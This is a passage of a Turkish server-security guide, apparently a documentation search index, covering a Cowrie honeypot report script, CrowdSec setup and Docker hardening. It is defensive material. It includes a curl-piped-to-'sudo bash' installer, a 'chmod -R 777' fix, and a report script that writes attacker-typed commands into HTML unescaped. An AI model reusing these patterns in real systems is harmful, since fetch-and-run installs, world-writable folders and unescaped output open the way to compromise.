class=\\\"count\\\"&gt;\"$1\"&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;\"}')\n            &lt;/table&gt;\n        &lt;/div&gt;\n\n        &lt;div class=\"card\"&gt;\n            &lt;h2&gt;\ud83d\udc64 En \u00c7ok Denenen Kullan\u0131c\u0131lar&lt;/h2&gt;\n            &lt;table&gt;\n                &lt;tr&gt;&lt;th&gt;Kullan\u0131c\u0131&lt;/th&gt;&lt;th&gt;Deneme&lt;/th&gt;&lt;/tr&gt;\n                $(cat $LOG_FILE | jq -r 'select(.username != null) | .username' | sort | uniq -c | sort -rn | head -10 | awk '{print \"&lt;tr&gt;&lt;td&gt;\"$2\"&lt;/td&gt;&lt;td&gt;&lt;span class=\\\"count\\\"&gt;\"$1\"&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;\"}')\n            &lt;/table&gt;\n        &lt;/div&gt;\n\n        &lt;div class=\"card\"&gt;\n            &lt;h2&gt;\ud83d\udcbb Son \u00c7al\u0131\u015ft\u0131r\u0131lan Komutlar&lt;/h2&gt;\n            &lt;table&gt;\n                &lt;tr&gt;&lt;th&gt;IP&lt;/th&gt;&lt;th&gt;Komut&lt;/th&gt;&lt;/tr&gt;\n                $(cat $LOG_FILE | jq -r 'select(.eventid == \"cowrie.command.input\") | \"&lt;tr&gt;&lt;td class=\\\"ip\\\"&gt;\\(.src_ip)&lt;/td&gt;&lt;td class=\\\"command\\\"&gt;\\(.input)&lt;/td&gt;&lt;/tr&gt;\"' | tail -10)\n            &lt;/table&gt;\n        &lt;/div&gt;\n\n        &lt;div class=\"card full-width\"&gt;\n            &lt;h2&gt;\ud83e\udda0 \u0130ndirilen Zararl\u0131 Yaz\u0131l\u0131mlar&lt;/h2&gt;\n            &lt;pre&gt;$(ls -lh /mnt/block/cowrie/var/lib/cowrie/downloads/ 2&gt;/dev/null | tail -n +2 | awk '{print $9 \" (\" $5 \")\"}')&lt;/pre&gt;\n            $(if [ -z \"$(ls /mnt/block/cowrie/var/lib/cowrie/downloads/ 2&gt;/dev/null)\" ]; then echo \"&lt;p style='color:#888;'&gt;Hen\u00fcz malware yakalanmad\u0131&lt;/p&gt;\"; fi)\n        &lt;/div&gt;\n\n        &lt;div class=\"card full-width\"&gt;\n            &lt;h2&gt;\u26a1 Son 10 Olay (Canl\u0131 Ak\u0131\u015f)&lt;/h2&gt;\n            &lt;table&gt;\n                &lt;tr&gt;&lt;th&gt;Zaman&lt;/th&gt;&lt;th&gt;IP&lt;/th&gt;&lt;th&gt;Olay&lt;/th&gt;&lt;th&gt;Detay&lt;/th&gt;&lt;/tr&gt;\n                $(cat $LOG_FILE | jq -r '\n                  if .eventid == \"cowrie.login.success\" then\n                    \"&lt;tr&gt;&lt;td&gt;\\(.timestamp | split(\"T\")[1] | split(\".\")[0])&lt;/td&gt;&lt;td class=\\\"ip\\\"&gt;\\(.src_ip)&lt;/td&gt;&lt;td class=\\\"success\\\"&gt;\u2713 Giri\u015f&lt;/td&gt;&lt;td&gt;\\(.username):\\(.password)&lt;/td&gt;&lt;/tr&gt;\"\n                  elif .eventid == \"cowrie.login.failed\" then\n                    \"&lt;tr&gt;&lt;td&gt;\\(.timestamp | split(\"T\")[1] | split(\".\")[0])&lt;/td&gt;&lt;td class=\\\"ip\\\"&gt;\\(.src_ip)&lt;/td&gt;&lt;td class=\\\"danger\\\"&gt;\u2717 Ba\u015far\u0131s\u0131z&lt;/td&gt;&lt;td&gt;\\(.username):\\(.password // \"KEY\")&lt;/td&gt;&lt;/tr&gt;\"\n                  elif .eventid == \"cowrie.command.input\" then\n                    \"&lt;tr&gt;&lt;td&gt;\\(.timestamp | split(\"T\")[1] | split(\".\")[0])&lt;/td&gt;&lt;td class=\\\"ip\\\"&gt;\\(.src_ip)&lt;/td&gt;&lt;td&gt;\ud83d\udcbb Komut&lt;/td&gt;&lt;td class=\\\"command\\\"&gt;\\(.input)&lt;/td&gt;&lt;/tr&gt;\"\n                  else\n                    empty\n                  end\n                ' | tail -10)\n            &lt;/table&gt;\n        &lt;/div&gt;\n    &lt;/div&gt;\n\n&lt;/body&gt;\n&lt;/html&gt;\nEOF\n\necho \"\u2705 Rapor olu\u015fturuldu: $OUTPUT_FILE\"\n</code></pre> <ol> <li>\u00c7al\u0131\u015ft\u0131r\u0131labilir yap: <code>chmod +x /mnt/block/cowrie/create_report.sh</code></li> </ol>"},{"location":"security/cowrie-analysis/#raporu-webde-yaynla-nginx","title":"Raporu Web'de Yay\u0131nla (Nginx)","text":"<pre><code># Nginx zaten varsa, sembolik link olu\u015fturun (root yetkisi gerekir)\nsudo ln -sf /mnt/block/cowrie/report.html /var/www/html/honeypot.html\n\n# Sonra taray\u0131c\u0131dan girin\n# http://SUNUCU_IP/honeypot.html\n</code></pre>"},{"location":"security/cowrie-analysis/#6-sorun-giderme","title":"6. Sorun Giderme","text":"<p>Container Ba\u015flam\u0131yor</p> <pre><code>docker logs cowrie --tail 100\n</code></pre> <p>Permission Hatas\u0131 Volume map edilen klas\u00f6rlerin izinleri yanl\u0131\u015fsa container yazamaz.</p> <pre><code>sudo chmod -R 777 /mnt/block/cowrie/var/\ndocker compose restart\n</code></pre> <p>Log Dosyas\u0131 Yok</p> <pre><code>ls -la /mnt/block/cowrie/var/log/cowrie/\n# Bo\u015fsa klas\u00f6rleri elle olu\u015fturun\nmkdir -p /mnt/block/cowrie/var/log/cowrie\n</code></pre>"},{"location":"security/crowdsec/","title":"CrowdSec ile Modern Koruma \ud83d\udee1\ufe0f","text":"<p>CrowdSec, kitlesel istihbarat (crowd-sourced intelligence) kullanan modern bir g\u00fcvenlik arac\u0131d\u0131r. Fail2Ban'in \"yeni nesil\" halefi olarak d\u00fc\u015f\u00fcn\u00fclebilir.</p> <p>[!CAUTION] &gt; \u00d6nce Fail2ban'i Silin: CrowdSec kurmadan \u00f6nce sunucunuzda Fail2ban varsa mutlaka durdurun ve kald\u0131r\u0131n. \u0130kisi ayn\u0131 anda \u00e7al\u0131\u015fmamal\u0131d\u0131r (\u00c7ak\u0131\u015fma yarat\u0131r).</p> <pre><code>sudo systemctl stop fail2ban &amp;&amp; sudo apt remove fail2ban\n</code></pre>"},{"location":"security/crowdsec/#terimler-sozlugu-sozluk","title":"\ud83d\udd11 Terimler S\u00f6zl\u00fc\u011f\u00fc (S\u00f6zl\u00fck)","text":"<p>CrowdSec d\u00fcnyas\u0131na girmeden \u00f6nce bu d\u00f6rt terimi bilmek hayat kurtar\u0131r:</p> Terim Anlam\u0131 A\u00e7\u0131klama Bouncer Kap\u0131 G\u00f6revlisi Kararlar\u0131 uygulayan par\u00e7ad\u0131r. (\u00d6rn: <code>iptables</code> bouncer'\u0131 IP'yi bloklar). Scenario Kural/Senaryo Neyin sald\u0131r\u0131 oldu\u011funu tan\u0131mlar. (\u00d6rn: \"3 dakikada 5 hatal\u0131 SSH giri\u015fi\"). Decision Karar Bir senaryo tetiklenince al\u0131nan aksiyon. (\u00d6rn: \"Bu IP'yi 4 saat banla\"). Collection Paket \u0130lgili senaryo ve ayr\u0131\u015ft\u0131r\u0131c\u0131lar\u0131n (parsers) toplu halidir. (\u00d6rn: <code>crowdsecurity/nginx</code>). Alert Uyar\u0131 Bir sald\u0131r\u0131 tespit edildi\u011finde olu\u015fturulan kay\u0131t (Hen\u00fcz aksiyon al\u0131nmam\u0131\u015f olabilir)."},{"location":"security/crowdsec/#1-neden-crowdsec-fail2ban-vs-crowdsec","title":"1. Neden CrowdSec? (Fail2Ban vs CrowdSec)","text":"<p>Fail2Ban sadece sizin loglar\u0131n\u0131z\u0131 okur. CrowdSec ise herkesin deneyiminden faydalan\u0131r.</p> <p>D\u00fcnyan\u0131n bir ucundaki sald\u0131rgan ba\u015fka bir CrowdSec kullan\u0131c\u0131s\u0131na sald\u0131rd\u0131\u011f\u0131nda, IP adresi \"k\u00f6t\u00fc niyetli\" olarak i\u015faretlenir ve bu bilgi an\u0131nda (veya k\u0131sa s\u00fcrede) sizin sunucunuza da gelir. B\u00f6ylece sald\u0131rgan daha kap\u0131n\u0131za gelmeden engellenmi\u015f olur.</p> \u00d6zellik Fail2Ban CrowdSec Mant\u0131k Log okur, Regex ile banlar Log okur, Senaryo ile karar verir \u0130stihbarat Yok (Sadece yerel) Var (K\u00fcresel IP veritaban\u0131) H\u0131z H\u0131zl\u0131 \u00c7ok H\u0131zl\u0131 (Golang ile yaz\u0131lm\u0131\u015f) Y\u00f6netim Dosya tabanl\u0131 (Basit) CLI + Web Konsol (Modern) IPv6 Zor Tam Destek"},{"location":"security/crowdsec/#2-hzl-kurulum-debianubuntu","title":"2. H\u0131zl\u0131 Kurulum (Debian/Ubuntu)","text":"<p>Kurulum scripti gerekli repolar\u0131 otomatik ekler.</p> <pre><code>curl -s https://packagecloud.io/install/repositories/crowdsec/crowdsec/script.deb.sh | sudo bash\nsudo apt install -y crowdsec\n</code></pre> <p>Kurulum s\u0131ras\u0131nda CrowdSec, sunucunuzdaki servisleri (SSH, Nginx, Docker vb.) otomatik alg\u0131lar ve uygun koleksiyonlar\u0131 kurar.</p>"},{"location":"security/crowdsec/#firewall-bouncer-kurulumu-zorunlu","title":"Firewall Bouncer Kurulumu (Zorunlu)","text":"<p>CrowdSec tek ba\u015f\u0131na sadece \"tespit\" yapar (Detect). Engelleme yapmas\u0131 (Remediate) i\u00e7in \"Bouncer\" \u015fartt\u0131r.</p> <pre><code>sudo apt install -y crowdsec-firewall-bouncer-iptables\n</code></pre>"},{"location":"security/crowdsec/#3-kritik-ayar-whitelist-beyaz-liste","title":"3. Kritik Ayar: Whitelist (Beyaz Liste) \ud83c\udff3\ufe0f","text":"<p>Kendimizi banlamayal\u0131m! Kurulumdan hemen sonra kendi statik IP'nizi veya VPN IP'nizi beyaz listeye ekleyin.</p> <ol> <li> <p>Whitelist dosyas\u0131n\u0131 olu\u015fturun/d\u00fczenleyin:</p> <pre><code>sudo nano /etc/crowdsec/parsers/s02-enrich/my-whitelist.yaml\n</code></pre> </li> <li> <p>\u015eu i\u00e7eri\u011fi (kendi IP'nizle) ekleyin:</p> <pre><code>name: my-custom-whitelist\ndescription: \"Guvenli IP listem\"\nwhitelist:\n  reason: \"Ofis/Ev IP\"\n  ip:\n    - \"192.168.1.5\" # Yerel IP \u00f6rne\u011fi\n    - \"203.0.113.55\" # Statik WAN IP'niz\n  # cidr:                 # \u0130sterseniz blok olarak ekleyin\n  #   - \"192.168.0.0/24\"\n</code></pre> </li> <li> <p>Servisi yeniden y\u00fckleyin:     <pre><code>sudo systemctl reload crowdsec\n</code></pre></p> </li> </ol>"},{"location":"security/crowdsec/#4-kurulum-sonras-test-simulasyon-modu","title":"4. Kurulum Sonras\u0131 Test (Sim\u00fclasyon Modu) \ud83e\uddea","text":"<p>CrowdSec'i \"Sim\u00fclasyon\" moduna alarak kararlar\u0131n ger\u00e7ekten uygulanmamas\u0131n\u0131 (sadece loglanmas\u0131n\u0131) sa\u011flayabilirsiniz. \u0130lk kurulumda \u00f6nerilir.</p> <pre><code># Sim\u00fclasyonu a\u00e7\nsudo cscli simulation enable --global\n\n# Loglar\u0131 izle (Ba\u015fka bir terminalden sald\u0131r\u0131 denemesi yapabilirsiniz)\ntail -f /var/log/crowdsec.log\n</code></pre> <p>Her \u015feyin d\u00fczg\u00fcn \u00e7al\u0131\u015ft\u0131\u011f\u0131na emin olduktan sonra kapatmay\u0131 unutmay\u0131n:</p> <pre><code>sudo cscli simulation disable --global\nsudo systemctl reload crowdsec\n</code></pre>"},{"location":"security/crowdsec/#5-temel-komutlar-cscli","title":"5. Temel Komutlar (<code>cscli</code>)","text":"<p>CrowdSec'in kalbi <code>cscli</code> komutudur.</p>"},{"location":"security/crowdsec/#durum-ve-metrikler","title":"Durum ve Metrikler","text":"<pre><code># Genel sa\u011fl\u0131k durumu\nsudo cscli metrics\n\n# Bouncer'lar \u00e7al\u0131\u015f\u0131yor mu?\nsudo cscli bouncers list\n</code></pre>"},{"location":"security/crowdsec/#kararlar-ve-banlama","title":"Kararlar ve Banlama","text":"<pre><code># \u015eu an kimler banl\u0131?\nsudo cscli decisions list\n\n# Masum birini yanl\u0131\u015fl\u0131kla banlad\u0131ysan\u0131z:\nsudo cscli decisions delete --ip 1.2.3.4\n\n# Manuel banlama (4 saatli\u011fine)\nsudo cscli decisions add --ip 1.2.3.4 --duration 4h --reason \"Canim istedi\"\n</code></pre>"},{"location":"security/crowdsec/#uyarlar-alerts","title":"Uyar\u0131lar (Alerts)","text":"<pre><code># Ge\u00e7mi\u015f uyar\u0131lar\u0131 listele\nsudo cscli alerts list\n</code></pre>"},{"location":"security/crowdsec/#6-koleksiyonlar-ve-senaryolar","title":"6. Koleksiyonlar ve Senaryolar \ud83d\udce6","text":"<p>CrowdSec \"Hub\" mant\u0131\u011f\u0131yla \u00e7al\u0131\u015f\u0131r. \u0130htiyac\u0131n\u0131z olan koruma paketlerini indirirsiniz.</p> <pre><code># Nginx korumas\u0131 ekle (HTTP sald\u0131r\u0131lar\u0131 i\u00e7in)\nsudo cscli collections install crowdsecurity/nginx\nsudo systemctl reload crowdsec\n</code></pre> <p>Varsay\u0131lan olarak <code>crowdsecurity/linux</code> (SSH, Sudo vb.) zaten kuruludur.</p>"},{"location":"security/crowdsec/#7-docker-entegrasyonu","title":"7. Docker Entegrasyonu \ud83d\udc33","text":"<p>Docker kullan\u0131yorsan\u0131z, container loglar\u0131n\u0131 CrowdSec'e okutmal\u0131s\u0131n\u0131z.</p>"},{"location":"security/crowdsec/#yontem-1-host-uzerinden-onerilen","title":"Y\u00f6ntem 1: Host \u00dczerinden (\u00d6nerilen)","text":"<p>CrowdSec host makinede kuruluysa, Docker'\u0131n log dizinini okumas\u0131 yeterlidir: <code>acquis.yaml</code> dosyas\u0131na ekleyin.</p> <pre><code># /etc/crowdsec/acquis.yaml\nfilenames:\n  - /var/lib/docker/containers/*/*.log\nlabels:\n  type: docker\n</code></pre>"},{"location":"security/crowdsec/#yontem-2-tam-docker-stack-compose-ornegi","title":"Y\u00f6ntem 2: Tam Docker Stack (Compose \u00d6rne\u011fi)","text":"<p>E\u011fer her \u015feyi Docker i\u00e7inde \u00e7al\u0131\u015ft\u0131rmak isterseniz \u00f6rnek <code>docker-compose.yml</code>:</p> <pre><code>version: \"3\"\nservices:\n  crowdsec:\n    image: crowdsecurity/crowdsec\n    environment:\n      GID: \"1000\"\n      COLLECTIONS: \"crowdsecurity/linux crowdsecurity/traefik\" # \u0130htiya\u00e7 duyulanlar\n    volumes:\n      - ./crowdsec-db:/var/lib/crowdsec/data\n      - ./crowdsec-config:/etc/crowdsec\n      - /var/log/auth.log:/var/log/auth.log:ro\n    security_opt:\n      - no-new-privileges:true\n\n  bouncer-iptables:\n    image: crowdsecurity/crowdsec-firewall-bouncer-iptables\n    environment:\n      API_KEY: \"${API_KEY}\" # CrowdSec'ten alaca\u011f\u0131n\u0131z anahtar\n    cap_add:\n      - NET_ADMIN\n      - NET_RAW\n    network_mode: host # Firewall y\u00f6netimi i\u00e7in \u015fart\n</code></pre>"},{"location":"security/crowdsec/#8-web-konsol-vizibilite","title":"8. Web Konsol (Vizibilite) \ud83c\udf0d","text":"<p>Sunucunuz ne yap\u0131yor g\u00f6rmek i\u00e7in app.crowdsec.net adresine kay\u0131t olun.</p> <ol> <li>Hesap a\u00e7\u0131n.</li> <li>Sunucunuzdan kay\u0131t komutunu girin:     <pre><code>sudo cscli console enroll &lt;SIZE_VERILEN_KOD&gt;\n</code></pre></li> <li>Art\u0131k sald\u0131r\u0131lar\u0131 harita \u00fczerinde canl\u0131 izleyebilirsiniz!</li> </ol>"},{"location":"security/crowdsec/#9-sorun-giderme-troubleshooting","title":"9. Sorun Giderme (Troubleshooting) \ud83d\udd27","text":"<p>S: Bir IP banland\u0131 ama hala eri\u015febiliyor? C: Bouncer kurulmam\u0131\u015f veya \u00e7al\u0131\u015fm\u0131yor olabilir. <code>sudo cscli bouncers list</code> ile kontrol edin.</p> <p>S: Kendi IP'mi banlad\u0131m! C: Acil durum: Ba\u015fka bir IP'den (mobil veri vb.) ba\u011flan\u0131p <code>sudo cscli decisions delete --ip &lt;IP&gt;</code> yap\u0131n. Sonra Whitelist ayarlay\u0131n!</p> <p>S: Loglarda \"file not found\" hatalar\u0131 var. C: <code>acquis.yaml</code> dosyas\u0131ndaki log yollar\u0131n\u0131 kontrol edin. Ubuntu'da auth loglar\u0131 <code>/var/log/auth.log</code>, baz\u0131lar\u0131nda <code>/var/log/secure</code> olabilir.</p>"},{"location":"security/docker-gateway/","title":"Docker Gateway Mimarisi \ud83d\udee1\ufe0f","text":"<p>Bu b\u00f6l\u00fcm, g\u00fcvenlik duvar\u0131n\u0131 (UFW) delmeden ve portlar\u0131 d\u0131\u015f d\u00fcnyaya sa\u00e7madan Docker konteynerlerinin nas\u0131l y\u00f6netilece\u011fini anlat\u0131r.</p>"},{"location":"security/docker-gateway/#sorun-port-3434-actm-hacklendim","title":"Sorun: \"Port 3434 A\u00e7t\u0131m, Hacklendim\"","text":"<p>Docker, a\u011f kurallar\u0131n\u0131 y\u00f6netmek i\u00e7in <code>iptables</code> ile do\u011frudan konu\u015fur. Siz UFW ile \"her \u015feyi kapat\" deseniz bile, <code>docker-compose.yml</code> dosyas\u0131nda \u015fu sat\u0131r\u0131 yazd\u0131\u011f\u0131n\u0131z an o port t\u00fcm d\u00fcnyaya a\u00e7\u0131l\u0131r:</p> <pre><code>ports:\n  - \"3000:3000\" # \u274c TEHL\u0130KEL\u0130: UFW'yi bypass eder ve t\u00fcm d\u00fcnyaya a\u00e7\u0131l\u0131r!\n</code></pre>"},{"location":"security/docker-gateway/#cozum-gateway-kap-modeli","title":"\u00c7\u00f6z\u00fcm: Gateway (Kap\u0131) Modeli","text":"<p>T\u00fcm trafi\u011fi tek bir g\u00fcvenli kap\u0131dan (Port 80/443) i\u00e7eri al\u0131p, i\u00e7eride da\u011f\u0131tma y\u00f6ntemidir.</p>"},{"location":"security/docker-gateway/#kritik-eksikler-ve-cozumleri","title":"\ud83d\udd25 Kritik Eksikler ve \u00c7\u00f6z\u00fcmleri","text":"<p>A\u015fa\u011f\u0131daki 3 kural\u0131 uygulamadan Docker sunucusu kurmay\u0131n.</p>"},{"location":"security/docker-gateway/#1-npm-admin-paneli-port-81-dunyaya-kapatlmal","title":"1. NPM Admin Paneli (Port 81) D\u00fcnyaya Kapat\u0131lmal\u0131!","text":"<p>Nginx Proxy Manager kurarken Port 81'i (Admin) d\u0131\u015far\u0131 a\u00e7mak b\u00fcy\u00fck risktir.</p> <p>Yanl\u0131\u015f:</p> <pre><code>ports:\n  - \"81:81\" # \u274c Admin paneli 0.0.0.0 \u00fczerinden d\u00fcnyaya a\u00e7\u0131k!\n</code></pre> <p>Do\u011fru: Admin paneline sadece sunucu i\u00e7inden (localhost) eri\u015filmeli. Eri\u015fmek i\u00e7in SSH Tunnel kullan\u0131n.</p> <pre><code>ports:\n  - \"127.0.0.1:81:81\" # \u2705 Sadece localhost eri\u015febilir\n</code></pre> <p>Nas\u0131l Eri\u015firim? (SSH Tunnel) Bilgisayar\u0131n\u0131zdan terminali a\u00e7\u0131n:</p> <pre><code>ssh -L 81:localhost:81 user@sunucu-ip\n</code></pre> <p>Taray\u0131c\u0131n\u0131zda: <code>http://localhost:81</code></p>"},{"location":"security/docker-gateway/#2-localhost-binding-npm-kullanmayanlar-icin","title":"2. Localhost Binding (NPM Kullanmayanlar \u0130\u00e7in)","text":"<p>E\u011fer NPM kullanm\u0131yorsan\u0131z, portu sadece sunucu i\u00e7inden eri\u015filebilir yap\u0131n ve Nginx'i buna g\u00f6re ayarlay\u0131n.</p> <pre><code>ports:\n  - \"127.0.0.1:3000:3000\" # \u2705 Sadece sunucu i\u00e7inden eri\u015filebilir\n</code></pre>"},{"location":"security/docker-gateway/#3-dockern-ufwyi-bypass-etmesini-engelleme","title":"3. Docker'\u0131n UFW'yi Bypass Etmesini Engelleme","text":"<p>Docker'\u0131n g\u00fcvenlik duvar\u0131n\u0131z\u0131 delmesini k\u00f6kten \u00e7\u00f6zmek i\u00e7in <code>/etc/docker/daemon.json</code> dosyas\u0131na \u015funu ekleyin:</p> <pre><code>{\n  \"iptables\": false\n}\n</code></pre> <p>Ard\u0131ndan <code>sudo systemctl restart docker</code>.</p> <p>\u26a0\ufe0f Dikkat: Bu ayar sonras\u0131 container'lar internete \u00e7\u0131kamayabilir. Geli\u015fmi\u015f kullan\u0131c\u0131lar i\u00e7indir.</p>"},{"location":"security/docker-gateway/#tam-ornek-npm-app-database","title":"\ud83c\udfd7\ufe0f Tam \u00d6rnek: NPM + App + Database","text":"<p>A\u015fa\u011f\u0131daki \u00f6rnekte:</p> <ol> <li>NPM: D\u0131\u015far\u0131ya tek \u00e7\u0131k\u0131\u015f noktas\u0131. Admin paneli g\u00fcvenli.</li> <li>App: D\u0131\u015far\u0131ya kapal\u0131, sadece NPM ve DB ile konu\u015fur.</li> <li>DB: D\u0131\u015far\u0131ya kapal\u0131, sadece App ile konu\u015fur.</li> </ol> <p><code>docker-compose.yml</code>:</p> <pre><code>version: \"3.8\"\n\nservices:\n  # 1. Nginx Proxy Manager (Gateway)\n  npm:\n    image: jc21/nginx-proxy-manager:latest\n    restart: unless-stopped\n    ports:\n      - \"80:80\" # HTTP (A\u00e7\u0131k)\n      - \"443:443\" # HTTPS (A\u00e7\u0131k)\n      - \"127.0.0.1:81:81\" # Admin (Sadece Localhost)\n    volumes:\n      - npm_data:/data\n      - npm_ssl:/etc/letsencrypt\n    networks:\n      - frontend # App ile konu\u015facak\n      # Database a\u011f\u0131na ba\u011flanmas\u0131na gerek YOK\n\n  # 2. Uygulama (Port YOK)\n  app:\n    image: node:18-alpine\n    restart: unless-stopped\n    expose:\n      - \"3000\" # Port mapping yok, sadece expose\n    networks:\n      - frontend # NPM ile konu\u015fur\n      - backend # DB ile konu\u015fur\n    environment:\n      DATABASE_URL: postgres://user:secret@db:5432/mydb\n\n  # 3. Veritaban\u0131 (\u0130zole)\n  db:\n    image: postgres:15-alpine\n    restart: unless-stopped\n    expose:\n      - \"5432\"\n    networks:\n      - backend # Sadece App ile konu\u015fur. NPM buray\u0131 g\u00f6rmez.\n    volumes:\n      - db_data:/var/lib/postgresql/data\n    environment:\n      POSTGRES_PASSWORD_FILE: /run/secrets/db_pass\n    secrets:\n      - db_pass\n\nnetworks:\n  frontend:\n    driver: bridge # NPM &lt;-&gt; App\n  backend:\n    driver: bridge # App &lt;-&gt; DB\n    internal: true # \ud83d\udd12 \u0130nternete \u00e7\u0131k\u0131\u015f YOK (G\u00fcvenli)\n\nvolumes:\n  npm_data:\n  npm_ssl:\n  db_data:\n\nsecrets:\n  db_pass:\n    file: ./secrets/db_password.txt\n</code></pre>"},{"location":"security/docker-gateway/#farkl-docker-composeyml-dosyalar-external-network","title":"\ud83c\udf10 Farkl\u0131 <code>docker-compose.yml</code> Dosyalar\u0131 (External Network)","text":"<p>NPM ana klas\u00f6rde, uygulaman\u0131z ba\u015fka klas\u00f6rde ise birbirlerini nas\u0131l bulurlar? External Network ile.</p> <ol> <li> <p>Network'\u00fc elle olu\u015fturun:</p> <pre><code>docker network create gateway-net\n</code></pre> </li> <li> <p>NPM Compose:</p> <pre><code>services:\n  npm:\n    networks:\n      - gateway-net\nnetworks:\n  gateway-net:\n    external: true # Var olan\u0131 kullan\n</code></pre> </li> <li> <p>App Compose: <code>yaml     services:       app:         networks:           - gateway-net     networks:       gateway-net:         external: true # Var olan\u0131 kullan</code>     Art\u0131k NPM \u00fczerinden <code>http://app:3000</code> \u015feklinde eri\u015febilirsiniz.</p> </li> </ol>"},{"location":"security/docker-gateway/#dogrulama-portlar-gercekten-kapal-m","title":"\u2705 Do\u011frulama: Portlar Ger\u00e7ekten Kapal\u0131 m\u0131?","text":"<p>Kurulumu yapt\u0131n\u0131z, peki g\u00fcvenli mi? Test edin.</p> <pre><code># 1. D\u0131\u015far\u0131dan port taramas\u0131 (Kendi bilgisayar\u0131n\u0131zdan)\nnmap -p 81,3000,5432 sunucu-ip\n# Beklenen: \"filtered\" veya \"closed\"\n\n# 2. Sunucu i\u00e7inden kontrol\nsudo netstat -tlnp | grep docker\n# 81 ve 3000 portlar\u0131 \"127.0.0.1\" IP'sine mi ba\u011fl\u0131? (0.0.0.0 OLMAMALI)\n\n# 3. Network \u0130zolasyon Testi\ndocker exec -it npm ping db\n# Beklenen: \"bad address\" veya timeout (NPM, DB'ye eri\u015fememeli!)\n</code></pre>"},{"location":"security/docker-gateway/#ssl-sertifikas-lets-encrypt","title":"\ud83d\udd12 SSL Sertifikas\u0131 (Let's Encrypt)","text":"<p>NPM aray\u00fcz\u00fcnden (localhost:81) kolayca SSL alabilirsiniz:</p> <ol> <li>Proxy Host eklerken SSL sekmesine gidin.</li> <li>Request a new SSL Certificate se\u00e7in.</li> <li>Force SSL ve HTTP/2 aktif edin.</li> <li>Domain'in sunucu IP'sine y\u00f6nlendi\u011finden emin olun.</li> </ol>"},{"location":"security/docker/","title":"Docker G\u00fcvenli\u011fi (Container Hardening) \ud83d\udc33","text":"<p>Senin ya\u015fad\u0131\u011f\u0131n senaryo tam olarak buydu: <code>RCE A\u00e7\u0131\u011f\u0131 \u2192 Root Container \u2192 Tam Sistem Eri\u015fimi \u2192 Cryptominer/DDoS \u2192 \ud83d\udc80</code></p> <p>\u0130\u015fte bu zinciri k\u0131rmak i\u00e7in kapsaml\u0131 Docker g\u00fcvenlik rehberi.</p>"},{"location":"security/docker/#1-asla-root-olarak-calstrma-en-kritik","title":"1. ASLA Root Olarak \u00c7al\u0131\u015ft\u0131rma (En Kritik!) \ufffd","text":"<p>Varsay\u0131lan olarak Docker konteynerleri <code>root</code> yetkisiyle \u00e7al\u0131\u015f\u0131r. Konteynerden ka\u00e7an biri host makinede de <code>root</code> olur!</p>"},{"location":"security/docker/#cozum-1-dockerfileda-user-tanmla-en-iyisi","title":"\u00c7\u00f6z\u00fcm 1: Dockerfile'da USER Tan\u0131mla (En \u0130yisi)","text":"<pre><code># \u2705 DO\u011eRU Dockerfile\nFROM node:18-alpine\n\n# Sistem kullan\u0131c\u0131s\u0131 olu\u015ftur (UID: 1001)\nRUN addgroup -g 1001 appgroup &amp;&amp; \\\n    adduser -u 1001 -G appgroup -D appuser\n\nWORKDIR /app\nCOPY --chown=appuser:appgroup . .\n\n# Root'tan \u00e7\u0131k\nUSER appuser\n\nEXPOSE 3000\nCMD [\"node\", \"server.js\"]\n</code></pre>"},{"location":"security/docker/#cozum-2-docker-composeda-zorla","title":"\u00c7\u00f6z\u00fcm 2: Docker Compose'da Zorla","text":"<pre><code>services:\n  app:\n    image: my-app\n    user: \"1001:1001\" # UID:GID\n</code></pre>"},{"location":"security/docker/#2-read-only-filesystem-dosya-yazmay-kapat","title":"2. Read-Only Filesystem (Dosya Yazmay\u0131 Kapat) \ud83d\udcc1","text":"<p>Sald\u0131rgan i\u00e7eri girse bile dosya yazamas\u0131n, malware indiremesin.</p> <pre><code>services:\n  app:\n    image: my-app\n    read_only: true\n    tmpfs:\n      - /tmp:size=100M,mode=1777\n      - /var/run:size=50M\n    volumes:\n      - ./data:/app/data:rw # Sadece gerekli yere yazma izni\n</code></pre>"},{"location":"security/docker/#3-resource-limitleri-miner-korumas","title":"3. Resource Limitleri (Miner Korumas\u0131) \u26a1","text":"<p>CPU %100'e dayamas\u0131n, RAM t\u00fcketmesin.</p> <pre><code>services:\n  app:\n    image: my-app\n    deploy:\n      resources:\n        limits:\n          cpus: \"0.5\" # Max yar\u0131m i\u015flemci\n          memory: 512M # Max 512MB RAM\n        reservations:\n          cpus: \"0.25\"\n          memory: 256M\n    pids_limit: 100 # Fork bomb korumas\u0131\n    mem_swappiness: 0 # Swap yasak\n</code></pre>"},{"location":"security/docker/#4-network-izolasyonu","title":"4. Network \u0130zolasyonu \ud83c\udf10","text":"<p>Konteynerler d\u0131\u015far\u0131ya kafas\u0131na g\u00f6re \u00e7\u0131kamas\u0131n.</p> <pre><code>services:\n  backend:\n    image: my-api\n    networks:\n      - internal-net # Sadece bu a\u011fdaki veritaban\u0131na eri\u015febilir\n\nnetworks:\n  internal-net:\n    driver: bridge\n    internal: true # D\u0131\u015f d\u00fcnyaya (\u0130nternete) eri\u015fim YOK!\n</code></pre> <p>Not: <code>network_mode: host</code> kullanmak yasakt\u0131r!</p>"},{"location":"security/docker/#5-capabilities-privileges","title":"5. Capabilities &amp; Privileges \ud83d\udd10","text":"<p>Docker'\u0131n \"ben her \u015feyi yapar\u0131m\" yetkilerini t\u0131rpanlay\u0131n.</p> <pre><code>services:\n  app:\n    cap_drop:\n      - ALL # \u00d6nce her \u015feyi kapat\n    cap_add:\n      - NET_BIND_SERVICE # Sadece port a\u00e7abilsin\n    security_opt:\n      - no-new-privileges:true # Privilege escalation (yetki y\u00fckseltme) engelle\n</code></pre>"},{"location":"security/docker/#tehlikeli-alanlar","title":"Tehlikeli Alanlar \u26d4","text":"<ul> <li><code>--privileged</code>: ASLA kullanma! Host makinenin t\u00fcm cihazlar\u0131na eri\u015fim verir.</li> <li><code>/var/run/docker.sock</code>: Mount etme! Konteynerin di\u011fer konteynerleri silmesine/yaratmas\u0131na izin verir.</li> </ul>"},{"location":"security/docker/#6-secrets-yonetimi-sifre-saklama","title":"6. Secrets Y\u00f6netimi (\u015eifre Saklama) \ud83d\udd11","text":"<p>Environment de\u011fi\u015fkenleri (<code>-e PASSWORD=123</code>) <code>docker inspect</code> ile g\u00f6r\u00fclebilir. Docker Secrets kullan\u0131n.</p> <pre><code>services:\n  db:\n    image: postgres\n    environment:\n      POSTGRES_PASSWORD_FILE: /run/secrets/db_password\n    secrets:\n      - db_password\n\nsecrets:\n  